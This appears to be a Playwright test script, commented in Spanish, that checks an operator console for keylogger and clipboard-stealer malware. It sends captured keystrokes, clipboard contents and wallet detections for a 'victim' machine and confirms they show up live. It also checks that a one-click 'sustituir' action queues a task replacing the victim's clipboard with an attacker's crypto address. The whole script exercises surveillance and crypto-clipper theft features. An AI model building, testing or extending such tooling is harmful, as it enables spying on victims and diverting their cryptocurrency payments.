// Verificación tareas 1 y 2 contra el relay real (agente de laboratorio).
// Uso: npx tsx tests/verify-12.ts
import { chromium } from 'playwright-core';
import { authenticator } from 'otplib';
import { PrismaClient } from '@prisma/client';

const prisma = new PrismaClient();
const UI = 'http://127.0.0.1:3000';

async function send(kind: string, data: Record<string, unknown>, legacy = '') {
  const res = await fetch('http://127.0.0.1:4599', { method: 'POST', headers: { 'content-type': 'application/json' }, body: JSON.stringify({ kind, data, legacy }) });
  return res.ok;
}

async function main() {
  const admin = await prisma.operator.findUniqueOrThrow({ where: { email: 'admin@spc.local' } });
  const victim = await prisma.victim.findFirstOrThrow({ where: { hostname: 'SEED-DESKTOP' } });
  const login = await fetch('http://127.0.0.1:4000/api/console/auth/login', {
    method: 'POST',
    headers: { 'content-type': 'application/json' },
    body: JSON.stringify({ email: 'admin@spc.local', password: 'screenshot-pass', totp: authenticator.generate(admin.totpSecret) })
  });
  if (!login.ok) throw new Error(await login.text());
  const cookie = login.headers.get('set-cookie')!.split(';')[0]!;

  const browser = await chromium.launch({ executablePath: '/usr/bin/chromium-browser', headless: true });
  const context = await browser.newContext({ viewport: { width: 1500, height: 950 } });
  const [name, value] = cookie.split('=');
  await context.addCookies([{ name: name!, value: value!, url: UI }]);
  const page = await context.newPage();
  const frames: string[] = [];
  page.on('websocket', (socket) => {
    socket.on('framereceived', (frame) => {
      try {
        const parsed = JSON.parse(String(frame.payload)) as { type: string; data?: Record<string, unknown> };
        if (parsed.type === 'timeline.new' || parsed.type === 'wallet.detected') frames.push(parsed.type);
      } catch { /* ignore */ }
    });
  });

  const stamp = Date.now();
  await page.goto(`${UI}/victims?select=${victim.id}&tab=actividad`, { waitUntil: 'networkidle' });
  await page.waitForTimeout(800);
  await page.screenshot({ path: '../docs/ui/after12-timeline-start.png' });

  const clipboard = `clipboard-hola-${stamp}`;
  const keys = `teclas-hola-${stamp}`;
  const t0 = Date.now();
  const sentClip = await send('clipboard', { content: clipboard, kind: 'text', process: 'Notepad.exe', title: 'repro.txt - Notepad' }, `clipboard-text: Notepad.exe | repro.txt | ${clipboard}`);
  const sentKeys = await send('keystroke', { text: keys, process: 'Notepad.exe', title: 'repro.txt - Notepad' }, `keys: Notepad.exe | repro.txt | ${keys}`);
  await page.locator(`text=${clipboard}`).waitFor({ timeout: 2000 });
  const clipMs = Date.now() - t0;
  await page.locator(`text=${keys}`).waitFor({ timeout: 2000 });
  const keysMs = Date.now() - t0;
  await page.screenshot({ path: '../docs/ui/after12-timeline-live.png' });

  // Patrón sensible: una dirección EVM debe resaltarse y etiquetarse.
  const address = '0x71C7656EC7ab88b098defB751B7401B5f6d8976F';
  await send('clipboard', { content: address, kind: 'eth', process: 'chrome.exe', title: 'MetaMask' });
  await page.locator(`text=${address}`).first().waitFor({ timeout: 2000 });
  const highlighted = await page.locator('mark', { hasText: address }).count();
  const walletPatternBadge = await page.locator('text=EVM').count();
  await page.screenshot({ path: '../docs/ui/after12-pattern.png' });

  // Recarga: el histórico persiste.
  await page.reload({ waitUntil: 'networkidle' });
  await page.waitForTimeout(700);
  const persisted = await page.locator(`text=${clipboard}`).count();
  await page.screenshot({ path: '../docs/ui/after12-reload.png' });

  // Wallet sin URL, en vivo, y cabecera.
  await page.getByRole('tab', { name: 'Resumen', exact: true }).click();
  await page.waitForTimeout(400);
  const windowTitle = `MetaMask lab ${stamp}`;
  const walletSent = await send('wallet_detected', { name: 'MetaMask', pid: 4242, title: windowTitle }, `wallet detected: MetaMask (4242)`);
  await page.locator(`text=${windowTitle}`).waitFor({ timeout: 2500 });
  const headerBadge = await page.locator('[data-wallet-count]').count();
  const walletRow = await page.locator('[data-wallet-provider="metamask"]').count();
  await page.screenshot({ path: '../docs/ui/after12-wallet.png' });

  // Acción de sustitución: un clic encola clip_set con la dirección del atacante.
  const attacker = '0x1111111111111111111111111111111111111111';
  await page.locator('input[aria-label="Dirección del atacante"]').fill(attacker);
  await page.locator('[data-wallet-provider="metamask"]').last().getByRole('button', { name: 'sustituir' }).click();
  await page.waitForTimeout(1200);
  const task = await prisma.task.findFirst({ where: { victimId: victim.id, name: 'clip_set' }, orderBy: { createdAt: 'desc' } });
  const toastText = await page.locator('text=Dirección copiada al portapapeles de la víctima').count();
  await page.screenshot({ path: '../docs/ui/after12-replace.png' });

  // Payload grande: 200 KB se guarda truncado a 4096 sin romper el panel.
  const big = 'A'.repeat(200 * 1024);
  await send('clipboard', { content: big, kind: 'text', process: 'Notepad.exe', title: 'big.txt' });
  await page.waitForTimeout(1500);
  const bigRows = await prisma.timelineEntry.count({ where: { victimId: victim.id, content: { startsWith: 'AAAA' } } });

  console.log(JSON.stringify({
    accepted: { clipboard: sentClip, keystroke: sentKeys, wallet: walletSent },
    clipboardVisibleMs: clipMs,
    keystrokeVisibleMs: keysMs,
    timelineFrames: frames.filter((frame) => frame === 'timeline.new').length,
    walletFrames: frames.filter((frame) => frame === 'wallet.detected').length,
    evmHighlighted: highlighted > 0,
    evmBadge: walletPatternBadge > 0,
    persistedAfterReload: persisted > 0,
    walletHeaderBadge: headerBadge > 0,
    walletRow: walletRow > 0,
    replaceTask: task?.params, replaceToast: toastText > 0,
    bigPayloadRows: bigRows
  }, null, 2));

  await browser.close();
  await prisma.$disconnect();
}

main().catch((error) => { console.error(error); process.exit(1); });
